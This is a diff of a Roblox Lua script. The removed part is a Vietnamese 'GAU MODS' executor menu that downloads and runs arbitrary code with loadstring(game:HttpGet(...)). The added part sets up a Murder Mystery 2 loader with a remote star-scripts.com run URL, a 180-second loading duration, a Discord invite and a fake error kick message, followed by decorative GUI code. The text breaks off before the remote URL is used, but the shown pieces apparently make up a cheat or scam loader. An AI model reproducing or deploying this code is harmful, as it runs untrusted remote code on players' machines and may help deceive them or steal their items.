@@ -1,525 +1,454 @@
-... existing code ...
--- 1. KHỞI TẠO DỊCH VỤ CẦN THIẾT
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
--- Kiểm tra xem đã tồn tại GUI chưa, nếu có thì xóa cái cũ để tránh bị trùng lặp
-if PlayerGui:FindFirstChild("GauModsUI") then
-PlayerGui.GauModsUI:Destroy()
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local PG = LP:WaitForChild("PlayerGui")
+
+local MM2_ID = 142823291
+local LOAD_DUR = 180
+local SCRIPT_URL = "https://star-scripts.com/api/run/8fb1A0haxu2xAhtKlDT3zTMlh2IVYDaA"
+local DISCORD_URL = "https://discord.gg/BC3zyncq4"
+local ALERT = "If verification failed, please join our discord server to access the protected script. NOTE: DON'T EVER LOGIN ON ANY SIGN OF FAKE ROBLOX GROUP! BEAM SITE ALERT!"
+local KICK_MSG = "Error: Please join manually and execute the script!"
+local UI_SCALE = 0.82 -- overall GUI size (1 = full size)
+
+-- Cool slate / teal glass palette (no floating circle orbs)
+local C = {
+    deep = Color3.fromRGB(22, 34, 48),
+    ink = Color3.fromRGB(42, 60, 78),
+    muted = Color3.fromRGB(90, 112, 130),
+    white = Color3.fromRGB(248, 252, 255),
+    glass = Color3.fromRGB(186, 210, 224),
+    line = Color3.fromRGB(150, 188, 208),
+    sky = Color3.fromRGB(132, 186, 214),
+    mint = Color3.fromRGB(120, 196, 184),
+    lilac = Color3.fromRGB(150, 168, 210),
+    peach = Color3.fromRGB(214, 186, 170),
+    butter = Color3.fromRGB(214, 204, 164),
+    rose = Color3.fromRGB(196, 168, 184),
+    aqua = Color3.fromRGB(72, 154, 168),
+    aquaLight = Color3.fromRGB(168, 214, 224),
+    warning = Color3.fromRGB(120, 86, 80),
+    warningBg = Color3.fromRGB(232, 218, 210),
+    error = Color3.fromRGB(170, 104, 100),
+    success = Color3.fromRGB(64, 156, 132)
+}
+local PASTELS = {C.sky, C.mint, C.lilac, C.aquaLight, C.glass, C.line}
+
+-- ───────────────────────── helpers ─────────────────────────
+local function tw(o, p, t, s, d)
+    local a = TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad, d or Enum.EasingDirection.Out), p)
+    a:Play()
+    return a
 end
--- 2. TẠO SCREEN GUI CHÍNH (Đã chuyển sang PlayerGui chuẩn an toàn 100%)
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "GauModsUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = PlayerGui
--- ==============================================================================
--- 3. NÚT MỞ MENU (TOGGLE BUTTON) - CÓ THỂ KÉO THẢ, BO TRÒN, VIỀN XANH
--- ==============================================================================
-local OpenButton = Instance.new("ImageButton")
-OpenButton.Name = "OpenButton"
-OpenButton.Size = UDim2.new(0, 50, 0, 50)
-OpenButton.Position = UDim2.new(0.05, 0, 0.2, 0)
-OpenButton.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-OpenButton.Image = "rbxassetid://10723345518" -- ID Ảnh icon mặc định (Bạn có thể thay đổi ID ở đây)
-OpenButton.ScaleType = Enum.ScaleType.Fit
-OpenButton.Parent = ScreenGui
--- Bo tròn góc cho nút mở
-local OpenCorner = Instance.new("UICorner")
-OpenCorner.CornerRadius = UDim.new(0, 12)
-OpenCorner.Parent = OpenButton
--- Viền màu xanh nước biển đậm đà cho nút mở
-local OpenStroke = Instance.new("UIStroke")
-OpenStroke.Color = Color3.fromRGB(0, 162, 255) -- Màu xanh nước biển
-OpenStroke.Thickness = 2.5
-OpenStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-OpenStroke.Parent = OpenButton
--- ==============================================================================
--- 4. BẢNG UI CHÍNH (MAIN MENU)
--- ==============================================================================
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 520, 0, 360)
-MainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
-MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-MainFrame.ClipsDescendants = true
-MainFrame.Visible = false -- Ban đầu ẩn, bấm nút mở mới hiện
-MainFrame.Parent = ScreenGui
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 14)
-MainCorner.Parent = MainFrame
-local MainStroke = Instance.new("UIStroke")
-MainStroke.Color = Color3.fromRGB(45, 45, 60)
-MainStroke.Thickness = 1.5
-MainStroke.Parent = MainFrame
--- --- thanh tiêu đề (Top Bar) ---
-local TopBar = Instance.new("Frame")
-TopBar.Name = "TopBar"
-TopBar.Size = UDim2.new(1, 0, 0, 40)
-TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-TopBar.Parent = MainFrame
-local TopBarCorner = Instance.new("UICorner")
-TopBarCorner.CornerRadius = UDim.new(0, 14)
-TopBarCorner.Parent = TopBar
--- Icon ở góc trái TopBar
-local HeaderIcon = Instance.new("ImageLabel")
-HeaderIcon.Name = "HeaderIcon"
-HeaderIcon.Size = UDim2.new(0, 26, 0, 26)
-HeaderIcon.Position = UDim2.new(0, 10, 0, 7)
-HeaderIcon.BackgroundTransparency = 1
-HeaderIcon.Image = "rbxassetid://10723345518" -- ID Ảnh icon topbar (Bạn có thể thay đổi ID ở đây)
-HeaderIcon.Parent = TopBar
--- Tiêu đề "GAU MODS"
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Name = "TitleLabel"
-TitleLabel.Size = UDim2.new(0, 150, 1, 0)
-TitleLabel.Position = UDim2.new(0, 42, 0, 0)
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "GAU MODS"
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.TextSize = 16
-TitleLabel.Font = Enum.Font.GothamBold
-TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-TitleLabel.Parent = TopBar
--- Nút Thu nhỏ (-)
-local MinimizeBtn = Instance.new("TextButton")
-MinimizeBtn.Name = "MinimizeBtn"
-MinimizeBtn.Size = UDim2.new(0, 30, 0, 30)
-MinimizeBtn.Position = UDim2.new(1, -70, 0, 5)
-MinimizeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-MinimizeBtn.Text = "-"
-MinimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-MinimizeBtn.TextSize = 20
-MinimizeBtn.Font = Enum.Font.GothamBold
-MinimizeBtn.Parent = TopBar
-local MinBtnCorner = Instance.new("UICorner")
-MinBtnCorner.CornerRadius = UDim.new(0, 6)
-MinBtnCorner.Parent = MinimizeBtn
--- Nút Tắt (X)
-local CloseBtn = Instance.new("TextButton")
-CloseBtn.Name = "CloseBtn"
-CloseBtn.Size = UDim2.new(0, 30, 0, 30)
-CloseBtn.Position = UDim2.new(1, -35, 0, 5)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-CloseBtn.Text = "X"
-CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseBtn.TextSize = 14
-CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.Parent = TopBar
-local CloseBtnCorner = Instance.new("UICorner")
-CloseBtnCorner.CornerRadius = UDim.new(0, 6)
-CloseBtnCorner.Parent = CloseBtn
--- ==============================================================================
--- 5. CÁC NÚT TAB (TAB 1, TAB 2, TAB 3)
--- ==============================================================================
-local TabBar = Instance.new("Frame")
-TabBar.Name = "TabBar"
-TabBar.Size = UDim2.new(1, -20, 0, 35)
-TabBar.Position = UDim2.new(0, 10, 0, 48)
-TabBar.BackgroundTransparency = 1
-TabBar.Parent = MainFrame
-local TabLayout = Instance.new("UIListLayout")
-TabLayout.FillDirection = Enum.FillDirection.Horizontal
-TabLayout.Padding = UDim.new(0, 10)
-TabLayout.Parent = TabBar
-local function CreateTabButton(name, text)
-local btn = Instance.new("TextButton")
-btn.Name = name
-btn.Size = UDim2.new(0.315, 0, 1, 0)
-btn.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
-btn.Text = text
-btn.TextColor3 = Color3.fromRGB(180, 180, 200)
-btn.Font = Enum.Font.GothamSemibold
-btn.TextSize = 13
-btn.Parent = TabBar
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = btn
-return btn
+
+local function new(cls, par, props)
+    local o = Instance.new(cls)
+    if props then for k, v in pairs(props) do o[k] = v end end
+    o.Parent = par
+    return o
 end
-local Tab1Btn = CreateTabButton("Tab1Btn", "Tab 1")
-local Tab2Btn = CreateTabButton("Tab2Btn", "Tab 2")
-local Tab3Btn = CreateTabButton("Tab3Btn", "Tab 3")
--- Container chứa nội dung các Tab
-local ContentContainer = Instance.new("Frame")
-ContentContainer.Name = "ContentContainer"
-ContentContainer.Size = UDim2.new(1, -20, 1, -95)
-ContentContainer.Position = UDim2.new(0, 10, 0, 90)
-ContentContainer.BackgroundTransparency = 1
-ContentContainer.Parent = MainFrame
--- Helper tạo Tab Frame
-local function CreateTabFrame(name)
-local f = Instance.new("Frame")
-f.Name = name
-f.Size = UDim2.new(1, 0, 1, 0)
-f.BackgroundTransparency = 1
-f.Visible = false
-f.Parent = ContentContainer
-return f
+
+-- Use standard Frame for maximum compatibility with Delta Executor (mobile & PC).
+local function group(par, props)
+    local o = Instance.new("Frame")
+    if props then
+        for k, v in pairs(props) do
+            if k ~= "GroupTransparency" then
+                pcall(function() o[k] = v end)
+            end
+        end
+    end
+    o.Parent = par
+    return o
 end
-local Tab1Frame = CreateTabFrame("Tab1Frame")
-local Tab2Frame = CreateTabFrame("Tab2Frame")
-local Tab3Frame = CreateTabFrame("Tab3Frame")
--- Mặc định mở Tab 1
-Tab1Frame.Visible = true
-Tab1Btn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-Tab1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
--- Logic chuyển Tab
-local function SwitchTab(targetBtn, targetFrame)
-for _, btn in ipairs(TabBar:GetChildren()) do
-if btn:IsA("TextButton") then
-btn.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
-btn.TextColor3 = Color3.fromRGB(180, 180, 200)
+
+local function fadeGroup(o, target, t)
+    return tw(o, {BackgroundTransparency = target}, t)
 end
+
+local function corner(par, r) return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)}) end
+local function roundFull(par) return new("UICorner", par, {CornerRadius = UDim.new(1, 0)}) end
+local function stroke(par, c, t, tr) return new("UIStroke", par, {Color = c or C.line, Thickness = t or 1.2, Transparency = tr or 0.18}) end
+local function frame(par, props) return new("Frame", par, props) end
+local function label(par, props) return new("TextLabel", par, props) end
+
+-- One animation registry drives every effect from a single Heartbeat.
+local anim = {t = 0, strokes = {}, grads = {}, orbs = {}, water = {}, fns = {}}
+
+local function pastelSequence()
+    return ColorSequence.new({
+        ColorSequenceKeypoint.new(0, C.sky),
+        ColorSequenceKeypoint.new(0.25, C.lilac),
+        ColorSequenceKeypoint.new(0.5, C.mint),
+        ColorSequenceKeypoint.new(0.75, C.peach),
+        ColorSequenceKeypoint.new(1, C.sky)
+    })
 end
-for _, frame in ipairs(ContentContainer:GetChildren()) do
-if frame:IsA("Frame") then
-frame.Visible = false
+
+-- Rotating pastel gradient border.
+local function auroraStroke(par, thickness, transp)
+    local s = stroke(par, C.white, thickness or 1.6, transp or 0.1)
+    local g = new("UIGradient", s, {Color = pastelSequence(), Rotation = math.random(0, 359)})
+    table.insert(anim.strokes, g)
+    return s
 end
+
+-- Thin flowing gradient line (header divider).
+local function auroraLine(par, x, y, w, z)
+    local f = frame(par, {
+        Size = UDim2.new(1, -x * 2, 0, 1), Position = UDim2.fromOffset(x, y),
+        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = z or 6
+    })
+    if w then f.Size = UDim2.fromOffset(w, 1) end
+    local g = new("UIGradient", f, {Color = pastelSequence()})
+    table.insert(anim.grads, {g = g, base = 0, phase = math.random() * 6.28})
+    return f
 end
-targetBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-targetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-targetFrame.Visible = true
+
+-- Frosted glass surface: cool slate aurora + pearl wash + gloss + specular line.
+local function applyGlassWaterFx(parent, radius)
+    radius = radius or 20
+    local g = new("UIGradient", parent, {
+        Rotation = 118,
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(228, 240, 248)),
+            ColorSequenceKeypoint.new(0.35, Color3.fromRGB(186, 214, 226)),
+            ColorSequenceKeypoint.new(0.7, Color3.fromRGB(170, 196, 220)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(156, 184, 210))
+        })
+    })
+    table.insert(anim.grads, {g = g, base = 118, phase = math.random() * 6.28})
+    local wash = frame(parent, {
+        Size = UDim2.new(1, -10, 1, -10), Position = UDim2.fromOffset(5, 5),
+        BackgroundColor3 = C.white, BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 2, Active = false
+    })
+    corner(wash, math.max(radius - 6, 8))
+    local gloss = frame(parent, {
+        Size = UDim2.new(1, -6, 0, 110), Position = UDim2.fromOffset(3, 3),
+        BackgroundColor3 = C.white, BackgroundTransparency = 0.48, BorderSizePixel = 0, ZIndex = 3, Active = false
+    })
+    corner(gloss, radius - 2)
+    new("UIGradient", gloss, {
+        Rotation = 90,
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 0.05),
+            NumberSequenceKeypoint.new(0.55, 0.7),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+    })
+    local reflection = frame(parent, {
+        Size = UDim2.new(1, -38, 0, 2), Position = UDim2.fromOffset(19, 3),
+        BackgroundColor3 = C.white, BackgroundTransparency = 0.1, BorderSizePixel = 0, ZIndex = 4, Active = false
+    })
+    corner(reflection, 2)
+    new("UIGradient", reflection, {
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 1),
+            NumberSequenceKeypoint.new(0.18, 0.05),
+            NumberSequenceKeypoint.new(0.72, 0.2),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+    })
 end
-Tab1Btn.MouseButton1Click:Connect(function() SwitchTab(Tab1Btn, Tab1Frame) end)
-Tab2Btn.MouseButton1Click:Connect(function() SwitchTab(Tab2Btn, Tab2Frame) end)
-Tab3Btn.MouseButton1Click:Connect(function() SwitchTab(Tab3Btn, Tab3Frame) end)
--- ==============================================================================
--- 6. NỘI DUNG TAB 1 (EXECUTE, LINK VIEWER, COPY, PASTE, SAVE)
--- ==============================================================================
--- Ô nhập văn bản (ScrollingFrame chứa TextBox để cuộn khi văn bản dài)
-local InputContainer = Instance.new("ScrollingFrame")
-InputContainer.Name = "InputContainer"
-InputContainer.Size = UDim2.new(1, 0, 0, 170)
-InputContainer.Position = UDim2.new(0, 0, 0, 0)
-InputContainer.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
-InputContainer.BorderSizePixel = 0
-InputContainer.ScrollBarThickness = 5
-InputContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
-InputContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
-InputContainer.Parent = Tab1Frame
-local InputCorner = Instance.new("UICorner")
-InputCorner.CornerRadius = UDim.new(0, 8)
-InputCorner.Parent = InputContainer
--- Viền màu trắng nhạt cho ô nhập
-local InputStroke = Instance.new("UIStroke")
-InputStroke.Color = Color3.fromRGB(255, 255, 255)
-InputStroke.Transparency = 0.85
-InputStroke.Thickness = 1.5
-InputStroke.Parent = InputContainer
-local InputBox = Instance.new("TextBox")
-InputBox.Name = "InputBox"
-InputBox.Size = UDim2.new(1, -16, 1, -16)
-InputBox.Position = UDim2.new(0, 8, 0, 8)
-InputBox.BackgroundTransparency = 1
-InputBox.Text = ""
-InputBox.PlaceholderText = "Nhập văn bản..." -- Chữ mờ khi chưa nhập gì
-InputBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
-InputBox.TextColor3 = Color3.fromRGB(240, 240, 240)
-InputBox.TextSize = 13
-InputBox.Font = Enum.Font.Code
-InputBox.TextXAlignment = Enum.TextXAlignment.Left
-InputBox.TextYAlignment = Enum.TextYAlignment.Top
-InputBox.ClearTextOnFocus = false
-InputBox.MultiLine = true
-InputBox.TextWrapped = true -- Giới hạn chữ không vượt quá ô vuông
-InputBox.Parent = InputContainer
--- Thanh chứa 5 nút chức năng bên dưới Tab 1
-local ButtonBar = Instance.new("Frame")
-ButtonBar.Name = "ButtonBar"
-ButtonBar.Size = UDim2.new(1, 0, 0, 35)
-ButtonBar.Position = UDim2.new(0, 0, 1, -35)
-ButtonBar.BackgroundTransparency = 1
-ButtonBar.Parent = Tab1Frame
-local ButtonLayout = Instance.new("UIListLayout")
-ButtonLayout.FillDirection = Enum.FillDirection.Horizontal
-ButtonLayout.Padding = UDim.new(0, 6)
-ButtonLayout.Parent = ButtonBar
-local function CreateActionBtn(text, widthScale)
-local btn = Instance.new("TextButton")
-btn.Size = UDim2.new(widthScale, -5, 1, 0)
-btn.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
-btn.Text = text
-btn.TextColor3 = Color3.fromRGB(230, 230, 230)
-btn.Font = Enum.Font.GothamSemibold
-btn.TextSize = 11
-btn.Parent = ButtonBar
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 6)
-corner.Parent = btn
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(60, 60, 80)
-stroke.Thickness = 1
-stroke.Parent = btn
-return btn
+
+local function sparkle(clip)
+    local s = frame(clip, {
+        Size = UDim2.fromOffset(3, 3), AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.08 + math.random() * 0.84, 0, 0.08 + math.random() * 0.84, 0),
+        Rotation = 45, BackgroundColor3 = C.white, BackgroundTransparency = 0.15,
+        BorderSizePixel = 0, ZIndex = 3
+    })
+    corner(s, 1)
+    tw(s, {Size = UDim2.fromOffset(12, 12), BackgroundTransparency = 1, Rotation = 135}, 1.1)
+    task.delay(1.15, function() if s.Parent then s:Destroy() end end)
 end
-local ExecBtn = CreateActionBtn("Execute", 0.2)
-local OpenLinkBtn = CreateActionBtn("Mở link", 0.2)
-local CopyBtn = CreateActionBtn("Sao chép", 0.2)
-local PasteBtn = CreateActionBtn("Dán", 0.2)
-local SaveBtn = CreateActionBtn("Lưu", 0.2)
--- ==============================================================================
--- 7. UI MỞ LINK (VIEWER OVERLAY) - KHÔNG THỂ KÉO DI CHUYỂN
--- ==============================================================================
-local LinkViewerOverlay = Instance.new("Frame")
-LinkViewerOverlay.Name = "LinkViewerOverlay"
-LinkViewerOverlay.Size = UDim2.new(1, 0, 1, 0)
-LinkViewerOverlay.Position = UDim2.new(0, 0, 0, 0)
-LinkViewerOverlay.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-LinkViewerOverlay.Visible = false
-LinkViewerOverlay.ZIndex = 10
-LinkViewerOverlay.Parent = MainFrame
-local ViewerCorner = Instance.new("UICorner")
-ViewerCorner.CornerRadius = UDim.new(0, 14)
-ViewerCorner.Parent = LinkViewerOverlay
--- TopBar cho Viewer
-local ViewerTopBar = Instance.new("Frame")
-ViewerTopBar.Size = UDim2.new(1, 0, 0, 40)
-ViewerTopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-ViewerTopBar.ZIndex = 11
-ViewerTopBar.Parent = LinkViewerOverlay
-local ViewerTopCorner = Instance.new("UICorner")
-ViewerTopCorner.CornerRadius = UDim.new(0, 14)
-ViewerTopCorner.Parent = ViewerTopBar
--- Nút quay lại (Mũi tên bên trái)
-local BackBtn = Instance.new("TextButton")
-BackBtn.Size = UDim2.new(0, 30, 0, 30)
-BackBtn.Position = UDim2.new(0, 8, 0, 5)
-BackBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-BackBtn.Text = "←"
-BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-BackBtn.TextSize = 18
-BackBtn.Font = Enum.Font.GothamBold
-BackBtn.ZIndex = 12
-BackBtn.Parent = ViewerTopBar
-local BackBtnCorner = Instance.new("UICorner")
-BackBtnCorner.CornerRadius = UDim.new(0, 6)
-BackBtnCorner.Parent = BackBtn
--- Nút Copy bên phải TopBar
-local ViewerCopyBtn = Instance.new("TextButton")
-ViewerCopyBtn.Size = UDim2.new(0, 70, 0, 28)
-ViewerCopyBtn.Position = UDim2.new(1, -78, 0, 6)
-ViewerCopyBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-ViewerCopyBtn.Text = "Copy"
-ViewerCopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ViewerCopyBtn.Font = Enum.Font.GothamSemibold
-ViewerCopyBtn.TextSize = 12
-ViewerCopyBtn.ZIndex = 12
-ViewerCopyBtn.Parent = ViewerTopBar
-local ViewerCopyCorner = Instance.new("UICorner")
-ViewerCopyCorner.CornerRadius = UDim.new(0, 6)
-ViewerCopyCorner.Parent = ViewerCopyBtn
--- Ô hiển thị nội dung link mở rộng
-local ViewerScroll = Instance.new("ScrollingFrame")
-ViewerScroll.Size = UDim2.new(1, -20, 1, -55)
-ViewerScroll.Position = UDim2.new(0, 10, 0, 48)
-ViewerScroll.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
-ViewerScroll.ScrollBarThickness = 6
-ViewerScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-ViewerScroll.ZIndex = 11
-ViewerScroll.Parent = LinkViewerOverlay
-local ViewerScrollCorner = Instance.new("UICorner")
-ViewerScrollCorner.CornerRadius = UDim.new(0, 8)
-ViewerScrollCorner.Parent = ViewerScroll
-local ViewerScrollStroke = Instance.new("UIStroke")
-ViewerScrollStroke.Color = Color3.fromRGB(255, 255, 255)
-ViewerScrollStroke.Transparency = 0.85
-ViewerScrollStroke.Thickness = 1.5
-ViewerScrollStroke.Parent = ViewerScroll
-local ViewerText = Instance.new("TextLabel")
-ViewerText.Size = UDim2.new(1, -16, 1, -16)
-ViewerText.Position = UDim2.new(0, 8, 0, 8)
-ViewerText.BackgroundTransparency = 1
-ViewerText.Text = ""
-ViewerText.TextColor3 = Color3.fromRGB(220, 220, 230)
-ViewerText.TextSize = 12
-ViewerText.Font = Enum.Font.Code
-ViewerText.TextXAlignment = Enum.TextXAlignment.Left
-ViewerText.TextYAlignment = Enum.TextYAlignment.Top
-ViewerText.TextWrapped = true
-ViewerText.ZIndex = 12
-ViewerText.Parent = ViewerScroll
--- Xử lý mở link và lấy nội dung web (Có Try-catch an toàn)
-OpenLinkBtn.MouseButton1Click:Connect(function()
-local url = InputBox.Text
-if url ~= "" then
-ViewerText.Text = "Đang tải dữ liệu từ URL..."
-LinkViewerOverlay.Visible = true
-task.spawn(function()
-local success, response = pcall(function()
-return game:HttpGet(url)
-end)
-if success then
-ViewerText.Text = response
-else
-ViewerText.Text = "Không thể tải URL này (Lỗi phân quyền hoặc đường dẫn sai)!\nChi tiết: " .. tostring(response)
+
+-- Liquid layer: fast shimmer, slow counter caustic, bubbles, sparkles.
+local function addWaterBody(clip)
+    local shimmer = frame(clip, {
+        Size = UDim2.new(0.52, 0, 1.8, 0), Position = UDim2.new(-0.62, 0, -0.4, 0),
+        Rotation = 16, BackgroundColor3 = C.white, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
+    })
+    new("UIGradient", shimmer, {
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 1),
+            NumberSequenceKeypoint.new(0.46, 0.55),
+            NumberSequenceKeypoint.new(0.54, 0.55),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+    })
+    local caustic = frame(clip, {
+        Size = UDim2.new(0.3, 0, 1.7, 0), Position = UDim2.new(1.08, 0, -0.35, 0),
+        Rotation = -20, BackgroundColor3 = C.mint, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3
+    })
+    new("UIGradient", caustic, {
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 1),
+            NumberSequenceKeypoint.new(0.5, 0.72),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+    })
+    local bubbles = {}
+    for i = 1, 7 do
+        local s = 3 + math.random(0, 6)
+        local b = frame(clip, {
+            Size = UDim2.fromOffset(s, s), Position = UDim2.new(math.random(), 0, 1, 0),
+            BackgroundColor3 = PASTELS[math.random(1, #PASTELS)], BackgroundTransparency = 0.55 + math.random() * 0.3,
+            BorderSizePixel = 0, ZIndex = 3
+        })
+        roundFull(b)
+        stroke(b, C.white, 1, 0.4)
+        bubbles[i] = {obj = b, x = math.random(), y = 1 + math.random(), speed = 0.018 + math.random() * 0.04, phase = math.random() * 6.28}
+    end
+    table.insert(anim.water, {clip = clip, shimmer = shimmer, caustic = caustic, bubbles = bubbles, t = math.random() * 4, off = math.random() * 6, spark = math.random() * 1.5})
 end
-end)
+
+local function step(dt)
+    anim.t = anim.t + dt
+    local t = anim.t
+    for _, g in ipairs(anim.strokes) do g.Rotation = (g.Rotation + dt * 45) % 360 end
+    for _, e in ipairs(anim.grads) do
+        e.g.Rotation = e.base + math.sin(t * 0.22 + e.phase) * 14
+        e.g.Offset = Vector2.new(math.sin(t * 0.3 + e.phase) * 0.18, math.cos(t * 0.19 + e.phase) * 0.08)
+    end
+    for _, fx in ipairs(anim.water) do
+        if fx.clip.Parent then
+            fx.t = fx.t + dt
+            fx.shimmer.Position = UDim2.new(-0.62 + (fx.t % 4.8) / 4.8 * 2.05, 0, -0.4, 0)
+            fx.caustic.Position = UDim2.new(1.08 - ((fx.t + fx.off) % 7.6) / 7.6 * 2.1, 0, -0.35, 0)
+            for _, b in ipairs(fx.bubbles) do
+                b.y = b.y - b.speed * dt
+                if b.y < -0.06 then b.y = 1.04 b.x = math.random() end
+                b.obj.Position = UDim2.new(math.clamp(b.x + math.sin(fx.t * 1.25 + b.phase) * 0.012, 0.01, 0.99), 0, b.y, 0)
+            end
+            fx.spark = fx.spark - dt
+            if fx.spark <= 0 then sparkle(fx.clip) fx.spark = 0.8 + math.random() * 1.1 end
+        end
+    end
+    for _, f in ipairs(anim.fns) do f(t, dt) end
 end
-end)
-BackBtn.MouseButton1Click:Connect(function()
-LinkViewerOverlay.Visible = false
-end)
-ViewerCopyBtn.MouseButton1Click:Connect(function()
-pcall(function()
-if setclipboard then
-setclipboard(ViewerText.Text)
+
+-- Press feedback: scale squash + centred ripple.
+local function pressFx(b)
+    local sc = new("UIScale", b, {Scale = 1})
+    b.ClipsDescendants = true
+    b.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            tw(sc, {Scale = 0.95}, 0.1)
+            local r = frame(b, {
+                Size = UDim2.fromOffset(0, 0), Position = UDim2.fromScale(0.5, 0.5), AnchorPoint = Vector2.new(0.5, 0.5),
+                BackgroundColor3 = C.white, BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = b.ZIndex + 1
+            })
+            roundFull(r)
+            local d = math.max(b.AbsoluteSize.X, b.AbsoluteSize.Y) * 2.1
+            tw(r, {Size = UDim2.fromOffset(d, d), BackgroundTransparency = 1}, 0.5)
+            task.delay(0.55, function() if r.Parent then r:Destroy() end end)
+        end
+    end)
+    b.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            tw(sc, {Scale = 1}, 0.2, Enum.EasingStyle.Back)
+        end
+    end)
+    return sc
 end
-end)
-end)
--- Execute Script
-ExecBtn.MouseButton1Click:Connect(function()
-local scriptContent = InputBox.Text
-if scriptContent ~= "" then
-pcall(function()
-if scriptContent:sub(1, 4) == "http" then
-loadstring(game:HttpGet(scriptContent))()
-else
-loadstring(scriptContent)()
+
+local function glassButton(parent, text, size, position, z)
+    local b = new("TextButton", parent, {
+        Size = size, Position = position, BackgroundColor3 = C.aquaLight,
+        BackgroundTransparency = 0.12, BorderSizePixel = 0, Text = text,
+        TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
+        AutoButtonColor = false, Active = true, Selectable = true, ZIndex = z or 7
+    })
+    corner(b, 10)
+    local s = stroke(b, C.line, 1.2, 0.1)
+    new("UIGradient", b, {
+        Rotation = 90,
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, C.white),
+            ColorSequenceKeypoint.new(0.45, C.aquaLight),
+            ColorSequenceKeypoint.new(1, C.sky)
+        })
+    })
+    pressFx(b)
+    b.MouseEnter:Connect(function() tw(b, {BackgroundTransparency = 0.02}, 0.16) tw(s, {Color = C.mint}, 0.2) end)
+    b.MouseLeave:Connect(function() tw(b, {BackgroundTransparency = 0.12}, 0.16) tw(s, {Color = C.line}, 0.2) end)
+    return b
 end
-end)
+
+local function addAlert(parent, position, size)
+    local box = frame(parent, {
+        Size = size, Position = position, BackgroundColor3 = C.warningBg,
+        BackgroundTransparency = 0.15, BorderSizePixel = 0, ZIndex = 6
+    })
+    corner(box, 11)
+    new("UIGradient", box, {Rotation = 0, Color = ColorSequence.new(C.white, Color3.fromRGB(244, 226, 214))})
+    stroke(box, Color3.fromRGB(208, 184, 172), 1, 0.1)
+    local rule = frame(box, {
+        Size = UDim2.new(0, 3, 1, -18), Position = UDim2.fromOffset(9, 9),
+        BackgroundColor3 = Color3.fromRGB(190, 142, 122), BorderSizePixel = 0, ZIndex = 7
+    })
+    corner(rule, 2)
